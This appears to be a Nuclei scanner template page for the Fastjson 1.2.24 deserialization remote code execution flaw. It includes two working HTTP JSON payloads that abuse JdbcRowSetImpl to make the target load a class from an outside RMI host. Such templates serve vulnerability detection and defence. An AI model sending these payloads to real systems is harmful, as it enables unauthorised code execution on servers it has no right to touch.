# Nuclei Template: Fastjson 1.2.24 - Remote Code Execution
**Template ID:** fastjson-1-2-24-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`fastjson-1-2-24-rce.yaml`)

## Vulnerability Information & PoC

## Description
Fastjson 1.2.24 is susceptible to a deserialization remote code execution vulnerability.

## Steps to reproduce / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
        "autoCommit":true
    }
}

POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
   "@type":"com.sun.rowset.JdbcRowSetImpl",
   "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
   "autoCommit":true
}
```

## References
- https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce
- https://www.freebuf.com/vuls/208339.html
- https://github.com/wyzxxz/fastjson_rce_tool
